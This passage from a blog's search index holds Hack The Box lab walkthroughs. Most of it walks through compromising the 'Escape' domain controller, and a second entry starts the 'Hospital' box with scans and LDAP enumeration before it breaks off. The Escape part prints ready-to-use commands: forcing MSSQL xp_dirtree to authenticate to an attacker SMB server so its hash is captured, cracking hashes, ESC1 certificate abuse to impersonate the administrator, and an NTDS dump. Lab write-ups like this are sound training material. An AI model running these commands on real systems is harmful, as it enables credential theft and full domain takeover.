context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. DNS 53: Using dnsenum to enumerate DNS records: Run dnsenum to enumerate if there are any interesting records present: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt sequel.htb Nothing of note other than the standard DNS records for a DC. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d sequel.htb --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt Unfortunately we get no hits: SMB 445: Using netexec to check for null \u0026amp; guest session on SMB: I check for a null sesion using netexec but they have been disabled:\nnetexec smb $box -u '' -p '' --shares I check if the guest account has been disabled:\nnetexec smb $box -u 'guest' -p '' --shares It looks like we can access the Public \u0026amp; IPC$ We will focus on the Public share. Over view of IPC$ Share: Quick overview if you are unfamiliar with the IPC$ share: The IPC$ share (Inter-Process Communication) is a special administrative share in Windows which allows communication with programs via Named Pipes: It\u0026rsquo;s mainly used for inter-process communication between hosts over a network. It also enables remote administration of a system, allowing file and print sharing. It\u0026rsquo;s a default share on windows systems. Requires credentials for access, typically used in conjunction with administrative or user rights. But as you can see Guest creds can also work in some instances. It is possible to use IPC$ for enumeration (e.g., enumerating users, shares, groups or services). Connecting to the Public SMB Share using smbclient: I logon to the share using a guest session:\nsmbclient -U 'guest' \u0026quot;\\\\\\\\$box\\\\Public\u0026quot; I see they have a .pdf called SQL Server Procedures in the share I download the .pdf:\nGet \u0026quot;SQL Server Procedures.pdf\u0026quot; Attempting to extract creator names from the .PDF: If you are not aware, it is sometimes possible to extract valid domain usernames from pdf's if they have been created on a Windows host. As often the Creator Field is populated using the Windows User\u0026rsquo;s Logged-In Name\nSome reasons why the Creator Field Uses the Windows User\u0026rsquo;s Logged-In Name: PDF Metadata Collection:\nWhen creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system. System Environment Variables:\nThe logged-in Windows username is part of system environment variables. This is often used to populate fields like \u0026ldquo;Creator\u0026rdquo; in the PDF document. Program Defaults:\nBy default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user. Tracking Ownership:\nThis feature helps track the original creator or author of a document for auditing or document management purposes. Attempting to extract Usernames From the PDF using exiftool: exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq \u0026gt; userNames.txt I run it and check the output of the file, however there are no valid usernames, just that it was crated using Mozilla. Command Breakdown:\nexiftool -Creator -csv *pdf\nexiftool: Run the tool -Creator: Extracts the Creator metadata field from the files. -csv: Outputs the data in CSV format. This is the most important part for the rest of the command to work: The CSV format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF\u0026rsquo;s metadata is presented as a row, and each field (like \u0026ldquo;Creator\u0026rdquo;) is a column. This makes it easier to process the data programmatically. Simplicity: When using tools like cut, it’s easier to extract specific fields by referring to column numbers (e.g., -f2 for the second column), which is straightforward with CSV formatting. *pdf: Targets all PDF files in the current directory. | cut -d, -f2\n|: Pipes the output from the previous command into the next. cut: Extracts specific fields from the CSV output. -d,: Uses a comma as the delimiter (since it\u0026rsquo;s CSV data). -f2: Selects the second field, which contains the creator name. | sort: Sorts the creator names alphabetically.\n| uniq: Removes duplicate names, leaving only unique entries.\n\u0026gt; userNames.txt\nRedirects the final output (unique creator names) into a file named userNames.txt Finding Hard-Coded mSSQL Creds in the SQL Server Procedures PDF: Problematic MSSQL Instance:\nReading the PDF it details how the company has had issues with mistakes with the MSSQL instance. However it appears there is still a live server running on the DC (which we have seen from our NMAP scan) Hard Coded Creds:\nLooking on the second page we can see they hard creds for new hires and have placed these in the .pdf naughty, naughty! We will use these to connect Finding Usernames within the PDF: Finding Usernames: Looking through the file we can see that the users, Ryan, Tom \u0026amp; Brandon. There is also a mail to hyperlink to Brandon that reveals his username to be Brandon.brown@sequel.htb I will add these to my username list. Cred Stuffing \u0026amp; Meaning of \u0026ldquo;Guest\u0026rdquo; in the SMB Responses in netexec: I tried cred stuffing all of the users \u0026amp; the password I have found so far and got the below output, where (Guest) was appended to each attempt. I had never seen this before \u0026amp; it led me to this page: https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon Which says this:\nUsing a random username and password you can check if the target accepts guest logon. If so, it means that either the domain guest account or the local guest account of the server you\u0026rsquo;re targetting is enabled.\nGuest account in SMB: SMB servers often allow users to connect as a Guest, meaning the users have limited or no write permissions. The server may allow these users to read files but restrict their ability to modify or create new files. In this case sequel.htb\\ryan:GuestUserCantWrite1 (Guest) indicates that the ryan account is authenticated, but with Guest permissions, likely meaning the account does not have full access to resources. So when you see \u0026ldquo;Guest\u0026rdquo; listed after users like sequel.htb\\ryan, sequel.htb\\tom, etc., it indicates that the user account is being authenticated using the Guest account privileges in SMB. MSSQL 1433: I store each useful bit of information in VARS so I can easily call on them later and have to type way less: This is also a great way to ensure you make less mistakes \u0026amp; type-os. Cred stuffing the MSSQL Instance: I cred stuff with all the known users so far just incase they have not changed their password from the default password, however it appears they have. 2. Foothold: Connecting to the MSSQL Instance using impacket-mssqlclient: Connecting to the mssql instance: impacket-mssqlclient $domain/$user:$pass@$box Enumerating the MSSQL Instance: Looking through the mssql instance there are only default databases. I try and activate xp_cmdshell however we do not have perms: Capturing the MSSQL System Admin hash using Responder \u0026amp; xp_dirtree: I know that it\u0026rsquo;s possible to read files using xp_dirtree as I did this on the Manager box:\nhttps://bloodstiller.com/walkthroughs/manager-box/ I check if I can use xp_dirtree to read \u0026amp; list local files\nI cannot read files however my password is GuestUserCantWrite1 so lets see if we can write as I know it\u0026rsquo;s possible to host a malicious SMB server and request the DB instance attempt to connect so we can capture the MSSQL System Administrator Hash Just a note: impacket-mssqlclient.py has good tools built in already so you you can just run xp_dirtee \u0026lt;path\u0026gt; you do not have to use all args etc. I start Responder :\nsudo responder -v -I tun0 I use xp_dirtee to connect back to my malicious SMB server:\nexec master..xp_dirtree '\\\\10.10.14.38\\share\\' This is just \\\\\u0026lt;MYKALIIP\\FAKESHARE\u0026gt; Hash Caught:\nThis works as when we run the command using xp_dirtree it tries to connect \u0026amp; authorize to our malicious SMB server \u0026amp; Responder captures the hash: Overview of xp_dirtree: xp_dirtree is an extended stored procedure in Microsoft SQL Server.\nIt is used to list the directory structure (files and subdirectories) of a specified path on the server.\nCommand Injection Risk: Since it\u0026rsquo;s interacting with the OS, it can be a target for malicious input if not properly handled. (E.G. Getting it to connect to our malicious SMB server so we can capture hashes)\nUsing xp_dirtree:\nCalled using the syntax below:\nEXEC xp_dirtree 'path', depth, file_flag; Example: EXEC xp_dirtree 'C:\\inetpub\\wwwroot', 1, 1; Example: EXEC xp_dirtree 'C:\\', 1, 1; Notes: Path Specified: C:\\ Lists the contents of the root of the C drive. Depth Level: 1: Indicates it will list files and directories in the first level of the C drive. This includes files directly in C:\\ and the first-level directories under C:\\. File Flag: 1: Specifies that both files and directories should be included in the output. Output: The result set will contain: All files located directly in C:\\. All first-level subdirectories (e.g., C:\\Program Files, C:\\Windows, etc.). +Note+: The command does not recursively list files in subdirectories beyond the first level due to the specified depth of 1~. If you want to see files in deeper levels, you can increase the depth parameter e.g. 2, 3 etc Cracking the MSSQL System Admin using Hashcat : I fire up hashcat and good ol\u0026rsquo; trusty rockyou\nhashcat -m 5600 mssqlhash ~/Wordlists/rockyou.txt Cracked!! In theory we should be able to authorize as this DBA, activate xp_cmdshell and get code execution on the underlying OS. I verify it\u0026rsquo;s valid:\nEnumerating SMB as sql_svc user: I check with netexec if the user can connect to SMB and they can, they have access to the SYSVOL share as well as the NETLOGON share.\nSYSVOL Share Enumeration:\nI use smbmap to enumerate the share but there is nothing of note: smbmap -u $user -p $pass -H $box -r SYSVOl NETLOGON Share Enumeration:\nsmbmap -u $user -p $pass -H $box -r NETLOGON SYSVOL Share: Part of the SYSVOL directory is shared as the SYSVOL share; this is critical for distributing files necessary for Group Policy \u0026amp; will often be used to hold scripts on a DC so this is a good target to go after. Running bloodhound.py: I use bloodhound.py to enumerate the domain with the creds I have. python3 bloodhound.py -dc dc.sequel.htb -c All -u $user -p $pass -d sequel.htb -ns $box Looking at the results our current user does not have that many privielges so I will continue to enumerate. Connecting to the MSSQL as sql_svc: I connect to the host as sql_svx:\nI try and enable xp_cmdshell but am unable to:\nFinding a linked SQL Instance: +Correction+: This is wrong, I later found it was just showing me my existing database, I have left it in as I believe it\u0026rsquo;s important and show these mistakes.\nI check if there are any linked remote SQL instances running:\nSELECT srvname, isremote FROM sysservers; We can also run the inbuilt command in impacket-mssql: enum_links I try and connect but I am unable to access the instance Enumerating the Host Using xp_dirtree: I check if am able to use xp_dirtree to list files on the host:\nBingo I list the users home folders and find a Ryan.Cooper:\nI add his name to my users. I try and list his home folder but don\u0026rsquo;t have perms:\nI enumerate further and find that there is an ERRORLOG.BAK *file stored in C:\\SQLServer\\Logs\\\nDownloading ERRORLOG.BAK \u0026amp; why it\u0026rsquo;s important to re-check your tools: I try and use the SINGLE_CLOB approach to read the file but don\u0026rsquo;t have the required permissions:\nSELECT * FROM OPENROWSET(BULK N'C:\\SQLServer\\Logs\\ERRORLOG.BAK', SINGLE_CLOB) AS Contents I try and create a new MSSQL database so I can then import the ERROLOG.BAK into it:\nCREATE DATABASE hacker; Denied again. Using evil-winrm to retrieve the ERRORLOG.BAK file:\nI try and connect with evil-winrm which I was convinced I did earlier \u0026amp; couldn\u0026rsquo;t but tried again anyway \u0026amp; could connect!!! Slap me with the idiot gun stick!!! +Note+: This is something I want to stress, it\u0026rsquo;s really important to re-check tools in situations like this sometimes you get false positives \u0026amp; false negatives. Reading ERRORLOG.BAK \u0026amp; finding credentials for Ryan.Cooper: I open the ERRORLOG.BAK in my text editor:\nI search for the string \u0026ldquo;password\u0026rdquo; \u0026amp; get a hit containing Ryan.Coopers password: I verify if the creds are still valid using netexec:\nnetexec smb $box -u $user -p $pass --shares 3. Privilege Escalation: Enumerating the host as Ryan.Cooper: In this section I am going to show EVERYTHING I do, obviously blogs are cultivated and don\u0026rsquo;t show every little thing, but I want to show all the tools I try to get root.\nI connect via evil-winrm \u0026amp; retrive the flag:\nAutomated Enumeration: I check bloodhound:\nBut there is no clear path here so we need to enumerate the host and the user further: I try and run secretsdump.py:\n+Note+: This may seem weird to do now, however I have had success retriveing creds this way and moving laterally. Running LaZagne.exe:\nWe get nothing, will have to try harder…offsec is that you? I run SessionGopher.ps1 to check for any other sessions:\nI run privesccheck.ps1:\nI do see that LSA is not protected: Stored Credentials Enumeration: Check for stored creds using cmdkey: cmdkey /list User Enumeration: I enumerate users: net user +Note+: The reason my user enumeration is not more extensive is due to the fact that Groups, Users \u0026amp; Hosts are enumerated via bloodhound. My main goal at the moment is to find out what is happening on this specific DC. Basic System Enumeration: I try and gather basic systeminfo but am denied: Installed Program Enumeration: I list all the installed programs by querying the registry keys using powershell: *Evil-WinRM* PS C:\u0026gt; (\u0026#39;HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;, \u0026#39;HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;) | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, InstallLocation | Format-Table -AutoSize DisplayName DisplayVersion InstallLocation ----------- -------------- --------------- Microsoft SQL Server 2019 (64-bit) Microsoft SQL Server 2019 (64-bit) SQL Server 2019 Common Files 15.0.2000.5 Microsoft SQL Server 2019 Setup (English) 15.0.4013.40 SQL Server 2019 XEvent 15.0.2000.5 SQL Server 2019 XEvent 15.0.2000.5 SQL Server 2019 SQL Diagnostics 15.0.2000.5 Microsoft VSS Writer for SQL Server 2019 15.0.2000.5 Microsoft SQL Server 2019 T-SQL Language Service 15.0.2000.5 Microsoft SQL Server 2019 RsFx Driver 15.0.2000.5 SQL Server 2019 Common Files 15.0.2000.5 SQL Server 2019 Database Engine Shared 15.0.2000.5 SQL Server 2019 Shared Management Objects 15.0.2000.5 Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.29.30133 14.29.30133 SQL Server 2019 DMF 15.0.2000.5 Microsoft ODBC Driver 17 for SQL Server 17.7.2.1 SQL Server 2019 Shared Management Objects Extensions 15.0.2000.5 SQL Server 2019 Connection Info 15.0.2000.5 Microsoft OLE DB Driver for SQL Server 18.5.0.0 Microsoft SQL Server 2012 Native Client 11.4.7462.6 SQL Server 2019 Database Engine Services 15.0.2000.5 SQL Server 2019 Shared Management Objects 15.0.2000.5 SQL Server 2019 Shared Management Objects Extensions 15.0.2000.5 VMware Tools 12.0.6.20104755 C:\\Program Files\\VMware\\VMware Tools\\ SQL Server 2019 Batch Parser 15.0.2000.5 SQL Server 2019 Database Engine Shared 15.0.2000.5 SQL Server 2019 Database Engine Services 15.0.2000.5 Microsoft Visual C++ 2019 X64 Additional Runtime - 14.29.30133 14.29.30133 SQL Server 2019 DMF 15.0.2000.5 SQL Server 2019 Connection Info 15.0.2000.5 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.29.30133 14.29.30133.0 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.29.30133 14.29.30133.0 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.29.30133 14.29.30133 Browser for SQL Server 2019 15.0.2000.5 Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.40664 12.0.40664 Microsoft Visual C++ 2013 Redistributable (x86) - 12.0.40664 12.0.40664.0 Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.40664 12.0.40664 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.29.30133 14.29.30133 The only thing that looks interesting here is the VMWare install, however that could just be for the box to run. Path Enumeration: I enumerate the PATH: $Env:PATH I see that there is an installation of OpenSSH here: Drive Enumeration: I check for any other mounted drives: get-PSdrive What is interesting here is Cert, certificates can be used as a valid attack path. Scheduled Task Enumeration: I check for scheduled tasks: Get-ScheduledTask | select TaskName,State It is denied, however I can use schtasks, save the output and inspect later: schtasks /query /fo LIST /v \u0026gt; tasks.txt This provides ALOT of data, so we need to be smart with how we process it. At the moment I have kept it for later. Powershell History Enumeration: I try and check his powershell history file: Cat C:\\Users\\Ryan.Cooper\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt Get-ChildItem -Path \u0026quot;$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\u0026quot; | Format-Table -AutoSize Network Enumeration: I check to see if we are listening or presenting any interesting services:\nnetstat -nao Arp Table Enumeration:\narp -a There are some other hosts listed here, however as far as I am aware this is the only target for this engagement as it\u0026rsquo;s a single box, unless we are presenting different services on different nics \u0026amp; they have seperate IP\u0026rsquo;s. NIC enumeration:\nipconfig /all I check for additional NICS but there is nothing, so the entries in the arp table I imagine are part of HTB\u0026rsquo;s infrastructure. I check the routing table:\nroute print I attempt to enumerate network shares but I am denied:\nI check for VPN connections:\nrasdial Service/Process Enumeration: I attempt to list all processes running:\nI try with tasklist /svc \u0026amp; with wmic process list full but I am denied. I try and enumerate services using powershell:\nget-service It fails as I suspect, however we can also check services with evil-winrm. Listing running services using evil-winrm:\nThere are 3 services running with Privs, but 2 are Defender and the other is a standard windows component, so not hijackable as far as I am aware. Enumerating the password policy: Enumerating the password policy: net accounts Nothing of note Enumerating if the DC is vulnerable to any certificate privilege escalation techniques. I use certipy to check if the DC is vulnerable:\ncertipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box Reading the report it says the DC is vulnerable to the ESC1 attack path:\nUsing ESC1 Attack Chain to elevate privileges to Administrator: I retrieve the certificate template name from the file:\nI sync my clock:\nsudo ntpdate -s sequel.htb +Note+: If you see the below error this is most likely down to your attack host clock being too out of sync with the target. (Picture taken from a previous box where I learned the hard way) I request a cert:\ncertipy-ad req -username $user@$domain -password $pass -ca sequel-DC-CA -target ca.$domain -template UserAuthentication -upn administrator@$domain -dns dc.$domain +Note+: How we have used the name of the certificate we found in step 1 UserAuthentication +!!!SUCESS!!!+ I request to authenticate as the Administrator and retrieve the Administrator NT hash \u0026amp; creds stored in .ccache:\ncertipy-ad auth -pfx administrator_dc.pfx -dc-ip $box We have both the administrator hash as well as the creds stored in .ccache which we can use Kerberos authentication with. Attack Deep-Dive e.g Exploiting UPN\u0026rsquo;s in ESC1 Attacks: A Hackers Guide: What\u0026rsquo;s a UPN and Why Do We Care?\nFirst things first: UPN stands for User Principal Name (UPN). They\u0026rsquo;re commonly used when issuing certificates from a Microsoft Certificate Authority (CA) for user authentication. Here\u0026rsquo;s why they\u0026rsquo;re so important: They represent identity in certificates, usually in the Subject Alternative Name (SAN) extension. They link certificates to specific Active Directory accounts. They enable certificate mapping for authentication. They facilitate Single Sign-On (SSO) scenarios. They\u0026rsquo;re used in smart card logons. Sometimes, they even correspond to email addresses. Now onto the attack:\nESC1 is one of the most fundamental certificate-based attack vectors in Active Directory environments. It occurs when a certificate template allows for client authentication and is configured with dangerous enrollment permissions. Here\u0026rsquo;s why it matters: It\u0026rsquo;s incredibly common in enterprise environments Often overlooked during security assessments Can lead to complete domain compromise (like in this case) Relatively simple to execute The ESC1 Attack: Your Gateway to Domain Admin Privileges:\nThe ESC1 attack path revolves around a misconfigured certificate template that grants excessive enrollment permissions. Here\u0026rsquo;s the breakdown: We discover a template that allows client authentication (like the User template) We notice that low-privileged users (like Domain Users) have enrollment rights We request a certificate using this template We can now authenticate to services that accept certificate-based authentication From Certificate to Domain Access:\nBut wait, you might ask, \u0026ldquo;How do we actually leverage this certificate for privilege escalation?\u0026rdquo; Great question! Here\u0026rsquo;s the step-by-step process: First, we identify vulnerable templates:\nLook for templates that allow client authentication Check if Domain Users can enroll Verify the template is enabled We request and obtain our certificate:\nUsing Certipy The certificate is valid and trusted within the domain Here\u0026rsquo;s where the magic happens:\nWe can now authenticate to services that accept certificate auth +Note+: Certipy extracts this the admin hash from TGT and presents us with it as well as saving the TGT as a .cacche file so we can then perform PTT attacks from the comfort of our attack box. Privilege escalation opportunities:\nAuthenticate as a the privielged user with their hash. Authentication to sensitive services Potential for further certificate template abuse Why This Attack Vector is Significant:\nWidespread Impact: Many organizations use default certificate templates Persistence: Certificates typically have long validity periods This one is valide for 99 years!!! Stealth Factor: Certificate-based authentication generates fewer logs Chain Reaction: Can be combined with other ESC attacks for greater impact Detection and Prevention:\nAudit certificate template permissions regularly Restrict enrollment rights to necessary users only Disable unused certificate templates Monitor certificate request patterns Implement proper template security settings Tools of the Trade:\nCertipy : Your Swiss Army knife for certificate attacks Certutil : Built-in Windows tool for certificate operations Remember: ESC1 might seem basic, but it\u0026rsquo;s often the first step in a more complex attack chain. Don\u0026rsquo;t underestimate its potential impact on your Active Directory security posture!\n4. Ownership: Dumping NTDS.dit database: Dumping NTDS for ownership: netexec smb $box -u $user -H $hash -M ntdsutil Loading .ccache into the KRB5CCNAME Variable to Authenticate: I load the .ccache into the KRB5CCNAME Variable:\nI check it\u0026rsquo;s valid:\nnetexec smb $box -u administrator --use-kcache --shares It is, we can now authenticate with kerberos. Lessons Learned: What did I learn? I hadn\u0026rsquo;t actually used the ESC1 attack vector before only ESC7 in https://bloodstiller.com/walkthroughs/manager-box/ , so it was cool to that. I learned about netexec displaying guest when a random username and password is supplied as a way to show that guest logon is accepted on the target. I learned to always re-check my tools. That mistake with evil-winrm was silly. What silly mistakes did I make? See point 3 above. Oh I also tried to use the wrong certificate name when initially doing the exploit, copy \u0026amp; paste always! Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/escape-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/mysql\/": {
        "title": "MYSQL",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/mysql\/"
    },
    
    "http:\/\/localhost:1313\/tags\/ghostscript\/": {
        "title": "GhostScript",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/ghostscript\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/hospital-box\/": {
        "title": "Hospital HTB Walkthrough",
        "tags": ["Box","HTB","Medium","Windows","LDAP","GhostScript","Selenium","RoundCube",],
        "content": "Hospital Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Hospital How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  07:14:24 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 07:14 BST Nmap scan report for 10.129.229.189 Host is up (0.042s latency). Not shown: 980 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1801/tcp open msmq 2103/tcp open zephyr-clt 2105/tcp open eklogin 2107/tcp open msmq-mgmt 2179/tcp open vmrdp 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 11.09 seconds We safely assume this is a Domain Controller as it\u0026rsquo;s running several domain services, LDAP, SMB, Kerberos \u0026amp; DNS. It\u0026rsquo;s interesting to see that their is a proxy running on 8080 I have never seen these services before so this should be interesting: 2103/tcp open zephyr-clt Google tells me this is a old protocol used for IRC. 2105/tcp open eklogin Some quick googling says this is Kerberos Encrypted login. 2179/tcp open vmrdp This looks to be hyper-v\u0026rsquo;s guest console! There are lots of services we can glean information from here, ldap being the main one. In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh took 11s  07:14:39 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 07:15 BST Nmap scan report for 10.129.229.189 Host is up (0.039s latency). Not shown: 65506 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA) |_ 256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519) 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-30 13:18:20Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 443/tcp open ssl/http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28) |_http-title: Hospital Webmail :: Welcome to Hospital Webmail |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 1801/tcp open msmq? 2103/tcp open msrpc Microsoft Windows RPC 2105/tcp open msrpc Microsoft Windows RPC 2107/tcp open msrpc Microsoft Windows RPC 2179/tcp open vmrdp? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 3269/tcp open globalcatLDAPssl? | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: HOSPITAL | NetBIOS_Domain_Name: HOSPITAL | NetBIOS_Computer_Name: DC | DNS_Domain_Name: hospital.htb | DNS_Computer_Name: DC.hospital.htb | DNS_Tree_Name: hospital.htb | Product_Version: 10.0.17763 |_ System_Time: 2024-09-30T13:19:21+00:00 | ssl-cert: Subject: commonName=DC.hospital.htb | Not valid before: 2024-09-29T13:09:46 |_Not valid after: 2025-03-31T13:09:46 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 6404/tcp open msrpc Microsoft Windows RPC 6406/tcp open msrpc Microsoft Windows RPC 6407/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 6409/tcp open msrpc Microsoft Windows RPC 6615/tcp open msrpc Microsoft Windows RPC 6633/tcp open msrpc Microsoft Windows RPC 8080/tcp open http Apache httpd 2.4.55 ((Ubuntu)) |_http-open-proxy: Proxy might be redirecting requests | http-title: Login |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.55 (Ubuntu) 9389/tcp open mc-nmf .NET Message Framing 26327/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Linux 5.X (91%) OS CPE: cpe:/o:linux:linux_kernel:5.0 Aggressive OS guesses: Linux 5.0 (91%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-09-30T13:19:21 |_ start_date: N/A OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 292.59 seconds We can confirm we are working with a domain controller as the DNS name is DC.hospital.htb SMB signing is required. LDAP 389: Using LDAP anonymous bind to enumerate further:\nIf you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools  v3.12.6 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  07:16:00 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.229.189 with SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=hospital,DC=htb CN=Configuration,DC=hospital,DC=htb CN=Schema,CN=Configuration,DC=hospital,DC=htb DC=DomainDnsZones,DC=hospital,DC=htb DC=ForestDnsZones,DC=hospital,DC=htb Supported controls: We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=hospital,DC=htb ldapServiceName: hospital.htb:dc$@HOSPITAL.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: Any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 